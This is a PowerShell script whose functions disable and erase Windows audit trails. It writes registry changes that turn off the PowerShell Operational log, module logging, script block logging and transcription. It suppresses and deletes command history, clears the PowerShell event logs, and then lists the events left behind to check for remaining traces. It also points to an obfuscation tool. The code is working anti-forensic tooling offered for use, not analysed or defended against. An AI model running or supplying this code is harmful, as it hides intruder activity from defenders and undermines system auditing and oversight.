$SkriptVersion = "0.3, 30.01.2022"
#requires -version 5.1
#Requires -RunAsAdministrator

#Obfuscate
    #https://github.com/danielbohannon/Invoke-Obfuscation

#Get all EventLogs
    #Get-WinEvent -ListLog *PowerShell*
    #Description https://robwillis.info/2019/10/everything-you-need-to-know-to-get-started-logging-powershell/
        #Event Viewer > Application and Services Logs > Microsoft > Windows PowerShell
            #Module (4103) and Script block (4104)


#Collect EventLog Artifacts
    [System.DateTime]$StartTime = Get-Date 

    #AVOIDING LOGS
        #Run once and reboot
            function Disable-fmLoggingOnce{
                #FROM CMD! Disable in registry. restart required (restarting just the service will result in additional log entries -> works!
                #Microsoft-Windows-PowerShell/Operational
                    Read-Host "Command must be run directly via cmd not via powershell!"
                    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-PowerShell/Operational" /t REG_DWORD /v Enabled /d 0 /f

            }

        #Run before Script starts
            function Disable-fmLoggingBeforeScriptRun{
                #ModuleLogging (not enabled by default???)
                    $Key = "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
                    if(Test-Path $Key)
                    {
                        $value = Get-ItemProperty $Key | Select-Object -Property EnableModuleLogging
                        if($value -eq 1) 
                        { 
                            Write-Host "ModuleLogging is enabled. Disabling..." 
                            Set-ItemProperty -Path $Key -Name ModuleLogging -Value 0 -Force
                        }
                        else { Write-Host "ModuleLogging is disabled" }
                    }
                    else
                    { Write-Host "ModuleLogging is disabled" }
                #ScriptBlockLogging (not enabled by default???)
                    $Key = "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
                    if(Test-Path $Key)
                    {
                        $value = Get-ItemProperty $Key | Select-Object -Property EnableScriptBlockLogging
                        if($value -eq 1) 
                        { 
                            Write-Host "ScriptBlockLogging is enabled. Disabling..." 
                            Set-ItemProperty -Path $Key -Name EnableScriptBlockLogging -Value 0 -Force
                        }
                        else { Write-Host "ScriptBlockLogging is disabled" }
                    }
                    else
                    { Write-Host "ScriptBlockLogging is disabled" }

                #Transcriptions (not enabled by default???)
                    $Key = "HKLM:\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\PowerShell\Transcription"
                    if(Test-Path $Key)
                    {
                        $value = Get-ItemProperty $Key | Select-Object -Property EnableTranscripting
                        if($value -eq 1) 
                        { 
                            Write-Host "Transcriptions are enabled. Disabling..." 
                            Set-ItemProperty -Path $Key -Name EnableTranscripting -Value 0 -Force
                            Set-ItemProperty -Path $Key -Name EnableInvocationHeader -Value 0 -Force
                        }
                        else { Write-Host "Transcriptions are disabled" }
                    }
                    else
                    { Write-Host "Transcriptions are disabled" }
            }

        #Run in every new PowerShell session
        function Disable-fmLoggingInEverySession{
            #Logging
                $LogEngineLifeCycleEvent=$false
                $LogEngineHealthEvent=$false
                $LogProviderLifeCycleEvent=$false
                $LogProviderHealthEvent=$false      

            #History
                #Disable History
                    Set-PSReadlineOption -HistorySaveStyle SaveNothing
        }

        #Run at the end of sessions
        function Disable-fmLoggingAfterEverySession{
            #Current in-memory comand history of current session
                #Source: https://stackoverflow.com/questions/13257775/powershells-clear-history-doesnt-clear-history
                    Clear-Host
                    Clear-History

                    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
                    $null = [system.reflection.assembly]::loadwithpartialname("System.Windows.Forms")
                        [System.Windows.Forms.SendKeys]::Sendwait('%{F7 2}')

            #History files
                Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
                Remove-Item "$($env:USERPROFILE)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
        }

    #DELETING LOGS
    function Remove-fmLogs{
         #Old Logs
            Clear-EventLog "Windows PowerShell"
        #New Providers
            [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Microsoft-Windows-PowerShell/Operational")
            [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog("Microsoft-Windows-PowerShell/Admin")

        #Deleting the PowerShell logs results in LogEntry with ID 104 in the System logs
            Get-WinEvent -LogName "System" -MaxEvents 3 | Where-Object {$_.Id -eq 104 } | Select-Object timecreated,message,Id

        #Delete Log in Filesystem???
            #%SystemRoot%\System32\Winevt\Logs\
    }

#Collect EventLog Artifacts
function GET-fmCollectedArtefacts{
    [System.DateTime]$EndTime = Get-Date 

    Write-Host "System Event Logs: $StartTime  -   $EndTime"
    $EventFilter = @{LogName = "System"; StartTime=$StartTime; EndTime=$EndTime}
    Get-WinEvent -FilterHashTable $EventFilter -ErrorAction SilentlyContinue

    Write-Host "Application Event Logs:"
    $EventFilter = @{StartTime=$StartTime; EndTime=$EndTime; LogName="Application" }
    Get-WinEvent -FilterHashTable $EventFilter -ErrorAction SilentlyContinue | Format-Table TimeCreated, ID, ProviderName, Message -AutoSize –Wrap

    Write-Host "Security Event Logs:"
    $EventFilter = @{LogName = "Security"; StartTime=$StartTime; EndTime=$EndTime}
    Get-WinEvent -FilterHashTable $EventFilter -ErrorAction SilentlyContinue

        
    Write-Host "PowerShell Event Logs:"
    $EventFilter = @{StartTime=$StartTime; EndTime=$EndTime; LogName="Windows PowerShell","Microsoft-Windows-PowerShell/Operational","Setup" }
    Get-WinEvent -FilterHashTable $EventFilter -ErrorAction SilentlyContinue | Format-Table ProviderName, TimeCreated, ID, Message -AutoSize –Wrap
}